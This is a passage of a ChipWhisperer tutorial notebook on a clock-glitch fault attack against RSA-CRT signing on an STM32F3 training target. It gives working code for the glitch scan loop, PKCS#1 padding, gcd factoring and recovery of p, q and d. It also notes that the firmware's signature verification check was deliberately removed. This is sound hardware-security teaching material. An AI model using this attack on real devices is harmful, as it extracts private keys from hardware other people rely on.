      "Creating load file for Flash: simpleserial-rsa-CWLITEARM.hex\r\n",
      "arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature simpleserial-rsa-CWLITEARM.elf simpleserial-rsa-CWLITEARM.hex\r\n",
      ".\r\n",
      "Creating load file for EEPROM: simpleserial-rsa-CWLITEARM.eep\r\n",
      "arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom=\"alloc,load\" \\\r\n",
      "\t--change-section-lma .eeprom=0 --no-change-warnings -O ihex simpleserial-rsa-CWLITEARM.elf simpleserial-rsa-CWLITEARM.eep || exit 0\r\n",
      ".\r\n",
      "Creating Extended Listing: simpleserial-rsa-CWLITEARM.lss\r\n",
      "arm-none-eabi-objdump -h -S -z simpleserial-rsa-CWLITEARM.elf > simpleserial-rsa-CWLITEARM.lss\r\n",
      ".\r\n",
      "Creating Symbol Table: simpleserial-rsa-CWLITEARM.sym\r\n",
      "arm-none-eabi-nm -n simpleserial-rsa-CWLITEARM.elf > simpleserial-rsa-CWLITEARM.sym\r\n",
      "Size after:\r\n",
      "   text\t   data\t    bss\t    dec\t    hex\tfilename\r\n",
      "  20956\t    108\t   1820\t  22884\t   5964\tsimpleserial-rsa-CWLITEARM.elf\r\n",
      "+--------------------------------------------------------\r\n",
      "+ Built for platform CW-Lite Arm (STM32F3)\r\n",
      "+--------------------------------------------------------\r\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "simpleserial-rsa-arm.c: In function 'simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign':\r\n",
      "simpleserial-rsa-arm.c:190:28: warning: unused variable 'diff_no_optimize' [-Wunused-variable]\r\n",
      "     volatile unsigned char diff_no_optimize;\r\n",
      "                            ^~~~~~~~~~~~~~~~\r\n",
      "simpleserial-rsa-arm.c:189:19: warning: unused variable 'diff' [-Wunused-variable]\r\n",
      "     unsigned char diff;\r\n",
      "                   ^~~~\r\n",
      "simpleserial-rsa-arm.c:188:12: warning: unused variable 'i' [-Wunused-variable]\r\n",
      "     size_t i;\r\n",
      "            ^\r\n",
      "simpleserial-rsa-arm.c: In function 'real_dec':\r\n",
      "simpleserial-rsa-arm.c:344:21: warning: pointer targets in passing argument 1 of 'mbedtls_sha256' differ in signedness [-Wpointer-sign]\r\n",
      "      mbedtls_sha256(MESSAGE, 12, hash, 0);\r\n",
      "                     ^~~~~~~\r\n",
      "In file included from simpleserial-rsa-arm.c:28:0:\r\n",
      ".././crypto/mbedtls//include/mbedtls/sha256.h:127:6: note: expected 'const unsigned char *' but argument is of type 'const char *'\r\n",
      " void mbedtls_sha256( const unsigned char *input, size_t ilen,\r\n",
      "      ^~~~~~~~~~~~~~\r\n",
      "simpleserial-rsa-arm.c: In function 'get_pt':\r\n",
      "simpleserial-rsa-arm.c:370:1: warning: control reaches end of non-void function [-Wreturn-type]\r\n",
      " }\r\n",
      " ^\r\n"
     ]
    }
   ],
   "source": [
    "%%bash -s \"$PLATFORM\" \"$CRYPTO_TARGET\" \"$CRYPTO_OPTIONS\"\n",
    "cd ../../hardware/victims/firmware/simpleserial-rsa\n",
    "make PLATFORM=$1 CRYPTO_TARGET=$2 CRYPTO_OPTIONS=$3 OPT=2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attack Script"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Start by initializing the ChipWhisperer:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "ERROR:root:File `'Helper_Sciprts/Setup.ipynb.py'` not found.\n"
     ]
    }
   ],
   "source": [
    "%run \"Helper_Scripts/Setup.ipynb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.clock.adc_src = \"clkgen_x1\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, program it with our new firmware:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import time\n",
    "fw_path = \"../../hardware/victims/firmware/simpleserial-rsa/simpleserial-rsa-{}.hex\".format(PLATFORM)\n",
    "cw.programTarget(scope, prog, fw_path)\n",
    "time.sleep(1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Verifying Signatures"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's start by seeing if we can verify the signature that we get back. First, we run the signature calculation (there's a `time.sleep()` here to make sure the calculation finishes. You may need to increase this):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import time\n",
    "target.go_cmd = 't\\\\n'\n",
    "scope.arm()\n",
    "target.go()\n",
    "\n",
    "while target.isDone() is False:\n",
    "    timeout -= 1\n",
    "    time.sleep(0.01)\n",
    "\n",
    "try:\n",
    "    ret = scope.capture()\n",
    "    if ret:\n",
    "        print('Timeout happened during acquisition')\n",
    "except IOError as e:\n",
    "    print('IOError: %s' % str(e))\n",
    "    \n",
    "time.sleep(2)\n",
    "num_char = target.ser.inWaiting()\n",
    "output = target.ser.read(num_char, timeout=10)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(scope.adc.trig_count)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As you can see, the signature takes a long time! For the STM32F3, it should be around 12.7M cycles. Next, let's get the rest of the signature back and see what it looks like."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "target.go_cmd = '1\\\\n'\n",
    "target.go()\n",
    "time.sleep(0.2)\n",
    "num_char = target.ser.inWaiting()\n",
    "output += target.ser.read(num_char, timeout=10)\n",
    "\n",
    "target.go_cmd = '2\\\\n'\n",
    "target.go()\n",
    "time.sleep(0.2)\n",
    "num_char = target.ser.inWaiting()\n",
    "output += target.ser.read(num_char, timeout=10)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(output)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You should see something like:\n",
    "```\n",
    "r4F09799F6A59081B725599753330B7A2440ABC42606601622FE0C582646E32555303E1062A2989D9B4C265431ADB58DD\n",
    "z00\n",
    "r85BB33C4BB237A311BC40C1279528FD6BB36F94F534A4D8284A18AB8E5670E734C55A6CCAB5FB5EAE02BA37E2D56648D\n",
    "z00\n",
    "r7A13BBF17A0E07D607C07CBB72C7A7A77076376E8434CE6E136832DC95DB3D80\n",
    "z00\n",
    "```\n",
    "\n",
    "We'll need to strip all the extra simpleserial stuff out. This can be done like so:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "newout = output.replace(\"r\", \"\").replace(\"\\nz00\",\"\").replace(\"\\n\",\"\")\n",
    "print(newout)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Then we can convert this to binary using binascii:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import binascii\n",
    "sig = binascii.unhexlify(newout)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Finally, we can verify that the signature is correct using the PyCryptodome package:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from Crypto.PublicKey import RSA\n",
    "from Crypto.Signature import PKCS1_v1_5 \n",
    "\n",
    "from Crypto.Hash import SHA256\n",
    "\n",
    "E = 0x10001\n",
    "N = 0x9292758453063D803DD603D5E777D7888ED1D5BF35786190FA2F23EBC0848AEADDA92CA6C3D80B32C4D109BE0F36D6AE7130B9CED7ACDF54CFC7555AC14EEBAB93A89813FBF3C4F8066D2D800F7C38A81AE31942917403FF4946B0A83D3D3E05EE57C6F5F5606FB5D4BC6CD34EE0801A5E94BB77B07507233A0BC7BAC8F90F79\n",
    "m = b\"Hello World!\"\n",
    "\n",
    "hash_object = SHA256.new(data=m)\n",
    "pub_key = RSA.construct((N, E))\n",
    "signer = PKCS1_v1_5.new(pub_key) \n",
    "sig_check = signer.verify(hash_object, sig)\n",
    "print(sig_check)\n",
    "\n",
    "assert sig_check, f\"Failed to verify signature on device. Got: {newout}\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If everything worked out correctly, you should see `True` printed above. Now onto the actual attack."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Getting a Glitch"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As usual, we'll start off by setting up the glitch module:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.glitch.clk_src = \"clkgen\"\n",
    "scope.glitch.output = \"clock_xor\"\n",
    "scope.glitch.trigger_src = \"ext_single\"\n",
    "scope.glitch.repeat = 1\n",
    "scope.glitch.width = -9\n",
    "scope.glitch.offset = -38.3\n",
    "scope.io.hs2 = \"glitch\"\n",
    "print(scope.glitch)\n",
    "from collections import namedtuple\n",
    "Range = namedtuple('Range', ['min', 'max', 'step'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now for our actual attack loop. There's a lot going on here, so we'll move through a little slower than usual. Overall, what we want to do is:\n",
    "* Insert a glitch\n",
    "* Read the signature back\n",
    "* Verify that it's correct\n",
    "\n",
    "The first step is the same as earlier. For the last two, we'll cheat a little by checking the for the beginning of the correct signature before proceeding, but we could also read back the whole thing:\n",
    "\n",
    "```python\n",
    "# Read back signature\n",
    "num_char = target.ser.inWaiting()\n",
    "output = target.ser.read(num_char, timeout=10)\n",
    "    if \"4F09799\" not in output:\n",
    "        #Something abnormal has happened\n",
    "```\n",
    "\n",
    "Now that we've found some abnormal behaviour, we need to verify that the target hasn't crashed. This can be done pretty easily by checking if we got anything at all:\n",
    "\n",
    "```python\n",
    "if \"4F09799\" not in output:\n",
    "    #Something abnormal has happened\n",
    "    if len(output) > 0:\n",
    "        # Possible glitch!\n",
    "    else:\n",
    "        # Crash, reset and try again\n",
    "        print(f\"Probably crash at {scope.glitch.ext_offset}\")\n",
    "        reset_target(scope)\n",
    "        time.sleep(0.5)\n",
    "```\n",
    "\n",
    "As a last step, we'll build our full signature and do one final check to make sure everything looks okay:\n",
    "\n",
    "```python\n",
    "if len(output) > 0:\n",
    "    # Possible glitch!\n",
    "    print(f\"Possible glitch at offset {scope.glitch.ext_offset}\\nOutput: {output}\")\n",
    "    \n",
    "    # get rest of signature back\n",
    "    target.go_cmd = '1\\\\n'\n",
    "    target.go()\n",
    "    time.sleep(0.2)\n",
    "    num_char = target.ser.inWaiting()\n",
    "    output += target.ser.read(num_char, timeout=10)\n",
    "\n",
    "    target.go_cmd = '2\\\\n'\n",
    "    target.go()\n",
    "    time.sleep(0.2)\n",
    "    num_char = target.ser.inWaiting()\n",
    "    output += target.ser.read(num_char, timeout=10)\n",
    "    \n",
    "    # strip out extra simpleserial stuff\n",
    "    newout = output.replace(\"r\", \"\").replace(\"\\nz00\",\"\").replace(\"\\n\",\"\")\n",
    "    \n",
    "    print(f\"Full output: {newout}\")\n",
    "    if (len(newout) == 256) and \"r0001F\" not in output:\n",
    "        print(\"Very likely glitch!\")\n",
    "        break\n",
    "```\n",
    "\n",
    "We'll add in scanning over different over different offsets as well. We'll start at an offset of 7M cycles. We actually have a lot of area that we could place the glitch in, so the starting point is fairly arbitrary. For the STM32F3, this places the glitch near the beginning of the calculation for $s_2$. If you'd like, you can move `trigger_low()` into `simpleserial_mbedtls_rsa_private()` to see how long different parts of the algorithm take.\n",
    "\n",
    "All together, our attack loops looks like this:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from tqdm import tnrange\n",
    "import binascii\n",
    "import time\n",
    "for i in tnrange(7000000, 7100000):\n",
    "    scope.glitch.ext_offset = i\n",
    "    target.go_cmd = 't\\\\n'\n",
    "    scope.adc.timeout = 3\n",
    "    scope.arm()\n",
    "    target.go()\n",
    "\n",
    "    while target.isDone() is False:\n",
    "        timeout -= 1\n",
    "        time.sleep(0.01)\n",
    "\n",
    "    try:\n",
    "        ret = scope.capture()\n",
    "        if ret:\n",
    "            print('Timeout happened during acquisition')\n",
    "    except IOError as e:\n",
    "        print('IOError: %s' % str(e))\n",
    "    time.sleep(2)\n",
    "    \n",
    "    # Read back signature\n",
    "    num_char = target.ser.inWaiting()\n",
    "    output = target.ser.read(num_char, timeout=10)\n",
    "    if \"4F09799\" not in output:\n",
    "        # Something abnormal happened\n",
    "        if len(output) > 0:\n",
    "            # Possible glitch!\n",
    "            print(f\"Possible glitch at offset {scope.glitch.ext_offset}\\nOutput: {output}\")\n",
    "            \n",
    "            # Get rest of signature back\n",
    "            target.go_cmd = '1\\\\n'\n",
    "            target.go()\n",
    "            time.sleep(0.2)\n",
    "            num_char = target.ser.inWaiting()\n",
    "            output += target.ser.read(num_char, timeout=10)\n",
    "\n",
    "            target.go_cmd = '2\\\\n'\n",
    "            target.go()\n",
    "            time.sleep(0.2)\n",
    "            num_char = target.ser.inWaiting()\n",
    "            output += target.ser.read(num_char, timeout=10)\n",
    "            \n",
    "            # Strip out extra simpleserial stuff\n",
    "            newout = output.replace(\"r\", \"\").replace(\"\\nz00\",\"\").replace(\"\\n\",\"\")\n",
    "            print(f\"Full output: {newout}\")\n",
    "            if (len(newout) == 256) and \"r0001F\" not in output:\n",
    "                print(\"Very likely glitch!\")\n",
    "                break\n",
    "        else:\n",
    "            # Crash, reset and try again\n",
    "            print(f\"Probably crashed at {scope.glitch.ext_offset}\")\n",
    "            reset_target(scope)\n",
    "            time.sleep(0.5)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now, let's convert our glitched signature to binary and move on to the final part of the tutorial"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "sig = binascii.unhexlify(newout)\n",
    "print(sig)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Completing The Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We've got our glitched signature, but we've still got a little work to do. As was mentioned earlier, the message that's signed isn't the original message, it's a PKCS#1 v1.5 padded hash of it. Luckily, this standard's fairly simple. PKCS#1 v1.5 padding looks like:\n",
    "\n",
    "|00|01|ff...|00|hash_prefix|message_hash|\n",
    "\n",
    "Here, the ff... part is a string of ff bytes long enough to make the size of the padded message the same as n, while hash_prefix is an identifier number for the hash algorithm used on message_hash. In our case, SHA256 has the hash prefix `3031300d060960864801650304020105000420`.\n",
    "\n",
    "Altogether, the function to build this message looks like:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def build_message(m, N):\n",
    "    sha_id = \"3031300d060960864801650304020105000420\"\n",
    "    N_len = (len(bin(N)) - 2 + 7) // 8\n",
    "    pad_len = (len(hex(N)) - 2) // 2 - 3 - len(m)//2 - len(sha_id)//2\n",
    "    padded_m = \"0001\" + \"ff\" * pad_len + \"00\" + sha_id + m\n",
    "    return padded_m\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that we've got our function, we can build our message:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from Crypto.Hash import SHA256\n",
    "import binascii\n",
    "\n",
    "hash_object = SHA256.new(data=b\"Hello World!\")\n",
    "hashed_m = binascii.hexlify(hash_object.digest()).decode()\n",
    "padded_m = build_message(hashed_m, N)\n",
    "print(hashed_m)\n",
    "print(padded_m)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now all that's left is to use our gcd formula from earlier:\n",
    "\n",
    "$$p = gcd(s'^e - m, N)$$\n",
    "\n",
    "And we should get either p or q! These calculations can take a while (the Python version takes a few minutes), so the next block will try to use gmpy2 (a high precision library that runs much quicker than base Python). If you don't have gmpy2 installed, it will fall back to Python."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from math import gcd\n",
    "N = 0x9292758453063D803DD603D5E777D7888ED1D5BF35786190FA2F23EBC0848AEADDA92CA6C3D80B32C4D109BE0F36D6AE7130B9CED7ACDF54CFC7555AC14EEBAB93A89813FBF3C4F8066D2D800F7C38A81AE31942917403FF4946B0A83D3D3E05EE57C6F5F5606FB5D4BC6CD34EE0801A5E94BB77B07507233A0BC7BAC8F90F79\n",
    "e = 0x10001\n",
    "try:\n",
    "    import gmpy2\n",
    "    from gmpy2 import mpz\n",
    "    sig_int = mpz(int.from_bytes(sig, \"big\"))\n",
    "    m_int = mpz(int.from_bytes(binascii.unhexlify(padded_m), \"big\"))\n",
    "    p_test = gmpy2.gcd(sig_int**e - m_int, N)\n",
    "except (ImportError, ModuleNotFoundError) as error:\n",
    "    print(\"gmpy2 not found, falling back to Python\")\n",
    "    sig_int = int.from_bytes(sig, \"big\")\n",
    "    padded_m_int = int.from_bytes(binascii.unhexlify(padded_m), \"big\")\n",
    "    a = int.from_bytes(sig, \"big\")**e - int.from_bytes(binascii.unhexlify(padded_m), \"big\")\n",
    "    p_test = gcd(a, N)\n",
    "    \n",
    "print(hex(p_test))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Open up `simpleserial-arm-rsa.c` and see if the value printed out is either p or q!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Getting the Rest of the Private Values"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As mentioned earler, now that we have either p or q, we can derive the rest of the private values. The easiest is the other prime factor, which is just:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "q_test = N//p_test\n",
    "print(hex(q_test))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Finally, there's d, which can be derived by:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "phi = (q_test - 1)*(p_test - 1)\n",
    "def egcd(a, b):\n",
    "    x,y, u,v = 0,1, 1,0\n",
    "    while a != 0:\n",
    "        q, r = b//a, b%a\n",
    "        m, n = x-u*q, y-v*q\n",
    "        b,a, x,y, u,v = a,r, u,v, m,n\n",
    "        gcd = b\n",
    "    return gcd, x, y\n",
    "\n",
    "gcd, d, b = egcd(e, phi)\n",
    "\n",
    "print(hex(d))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Going Further"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "There's still more you can do with this attack:\n",
    "\n",
    "* You can try glitching the other part of the signature calculation to verify that you get the other prime factor of n out\n",
    "* We used clock glitching in this tutorial. You may want to try it with voltage glitching as well\n",
    "\n",
    "As mentioned earlier in the tutorial, a verification of the calculated signature was removed:\n",
    "```C\n",
    "    /* Compare in constant time just in case */\n",
    "    /* for( diff = 0, i = 0; i < ctx->len; i++ ) */\n",
    "    /*     diff |= verif[i] ^ sig[i]; */\n",
    "    /* diff_no_optimize = diff; */\n",
    "\n",
    "    /* if( diff_no_optimize != 0 ) */\n",
    "    /* { */\n",
    "    /*     ret = MBEDTLS_ERR_RSA_PRIVATE_FAILED; */\n",
    "    /*     goto cleanup; */\n",
    "    /* } */\n",
    "\n",
    "```\n",
    "\n",
    "This part is near the end of `simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign()`. If you want a larger challenge, you can try uncommenting that and trying to glitch past it as well."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Tests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "real_p = \"0xC36D0EB7FCD285223CFB5AABA5BDA3D82C01CAD19EA484A87EA4377637E75500FCB2005C5C7DD6EC4AC023CDA285D796C3D9E75E1EFC42488BB4F1D13AC30A57\".lower()\n",
    "real_q = \"0xC000DF51A7C77AE8D7C7370C1FF55B69E211C2B9E5DB1ED0BF61D0D9899620F4910E4168387E3C30AA1E00C339A795088452DD96A9A5EA5D9DCA68DA636032AF\".lower()\n",
    "assert (hex(p_test) == real_p) or (hex(p_test) == real_q), f\"Failed to break p or q. Got {hex(p_test)}, excepted {real_p} or {real_q}\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "assert (hex(q_test) == real_p) or (hex(q_test) == real_q), f\"Failed to break p or q. Got {hex(p_test)}, excepted {real_p} or {real_q}\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "real_d = \"0x24bf6185468786fdd303083d25e64efc66ca472bc44d253102f8b4a9d3bfa75091386c0077937fe33fa3252d28855837ae1b484a8a9a45f7ee8c0c634f99e8cddf79c5ce07ee72c7f123142198164234cabb724cf78b8173b9f880fc86322407af1fedfdde2beb674ca15f3e81a1521e071513a1e85b5dfa031f21ecae91a34d\"\n",
    "assert (hex(d) == real_d), f\"Failed to break private key d. Got {hex(d)}, expected {real_d}\""
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": true,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {
    "height": "calc(100% - 180px)",
    "left": "10px",
    "top": "150px",
    "width": "165px"
   },
   "toc_section_display": true,
   "toc_window_display": false
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
